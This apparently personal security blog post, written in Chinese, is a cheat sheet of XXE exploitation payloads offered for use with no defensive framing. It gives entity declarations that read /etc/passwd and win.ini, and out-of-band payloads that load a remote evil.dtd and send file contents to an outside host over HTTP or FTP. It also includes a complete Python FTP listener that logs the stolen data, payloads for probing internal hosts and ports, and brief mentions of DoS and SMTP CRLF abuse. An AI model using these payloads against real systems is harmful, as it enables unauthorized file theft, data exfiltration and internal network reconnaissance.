---
typora-root-url: ../../../static
title: "XXE利用"
date: 2021-01-17T12:28:36+08:00
draft: false
categories: ["security"]
---

## 有回显XXE
### 引用外部实体

	<?xml version="1.0" encoding="utf-8" ?>
	<!DOCTYPE foo [
		<!ELEMENT foo ANY >
        <!ENTITY s1 SYSTEM "file:///etc/passwd" >
    ]>
	<foo>&s1;</foo>

### 引用公共实体

	<?xml version="1.0" encoding="utf-8" ?>
	<!DOCTYPE root PUBLIC "test" "file:///etc/passwd">
	<root>&test;</root>

### 引用参数实体
当文件含有特殊符号的时候，如&,<,>,",'等。使用此种方式：

payload：

	<?xml version="1.0" encoding="utf-8"?> 
	<!DOCTYPE roottag [
	<!ENTITY % start "<![CDATA[">   
	<!ENTITY % goodies SYSTEM "file:///etc/passwd">  
	<!ENTITY % end "]]>">  
	<!ENTITY % dtd SYSTEM "http://ip/evil.dtd"> 
	%dtd; ]> 
	
	<roottag>&all;</roottag>

evil.dtd:

	<?xml version="1.0" encoding="UTF-8"?> 
	<!ENTITY all "%start;%goodies;%end;">

## 无回显XXE
### php环境下
payload：

	<!DOCTYPE convert [ 
	<!ENTITY % remote SYSTEM "http://ip/evil.dtd">
	%remote;%int;%send;
	]>

evil.dtd:

	<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///windows/win.ini">
	<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://ip:9999?p=%file;'>">

### Java环境下
JDK必须小于7u141或者小于8u162才可以读取没有特殊符号的文件(例如换行符号等)。

payload：

	<?xml version="1.0"?>
	<!DOCTYPE cdl [<!ENTITY % asd SYSTEM "http://ip:8000/evil.dtd">%asd;%c;]>
	<cdl>&rrr;</cdl>

evil.dtd:

	<!ENTITY % d SYSTEM "file:///C://windows/win.ini">
	<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://ip:2144/%d;'>">

开启FTP服务器的脚本如下：

	#!/usr/bin/env python3
	import socket
	import sys
	import argparse
	
	
	name = """
	Running...
	"""
	
	print(name)
	
	parser = argparse.ArgumentParser(description='An Out-of-Band XXE tool')
	parser.add_argument('port',type=int,help="Port for the FTP server to listen on (2121 / 21)")
	args = parser.parse_args()
	
	HOST = ''
	PORT = args.port
	
	welcome = b'oob-xxe\n'
	ftp_catch_all_response = b'more data please!\n'
	ftp_user_response = b'hello world!\n'
	ftp_pass_response = b'my password is also hunter2!\n'
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	def main():
	    try:
	        s.bind((HOST, PORT))
	    except socket.error as msg:
	        print('[+] ERROR: Bind failed. ')
	        sys.exit()
	
	    s.listen(10)
	    print('[+] OOB started on port: '+str(PORT))
	
	
	    conn, addr = s.accept()
	    print('[*] Connection from: '+addr[0])
	    conn.sendall(welcome)
	
	    while True:
	        data = conn.recv(1024)
	        ftp_command = data.split(b" ", 1)
	        response = {
	            'user': ftp_user_response,
	            'pass': ftp_pass_response,
	        }.get(ftp_command[0].lower(), ftp_catch_all_response)
	        conn.sendall(response)
	        line = data.decode('UTF-8')
	        line = line.replace("\n","").replace("CWD","")
	        print(line)
	        extract(line)
	    s.close()
	
	def extract(data):
	        fopen = open('./extracted.log', 'a')
	        fopen.write(data)
	        fopen.close()
	
	try:
	    main()
	except KeyboardInterrupt:
	    s.close()

## XXE内网主机和端口探测
### 内网主机探测
payload如下(使用burp的intruder修改ip)：

	<?xml version="1.0" encoding="utf-8" ?>
	<!DOCTYPE foo [
	    <!ELEMENT foo ANY >
	    <!ENTITY s1 SYSTEM "http://10.0.0.1" >
	]>
	<foo>&s1;</foo>

### 内网端口探测
payload如下（使用burp的intruder修改端口）：

	<?xml version="1.0" encoding="utf-8"?>  
	<!DOCTYPE data SYSTEM "http://127.0.0.1:515/" [  
	<!ELEMENT data (#PCDATA)>  
	]>
	<data>4</data>

## 一些其他利用方式
- `jar://` 协议文件上传。
- Dos攻击。
- 邮件钓鱼：如果内网有一台易受攻击的SMTP服务器，我们就能利用 `ftp://` 协议结合 `CRLF` 注入向其发送任意命令。


## 参考链接
- [一篇文章带你深入理解XXE](l0)

[l0]:https://xz.aliyun.com/t/3357#toc-1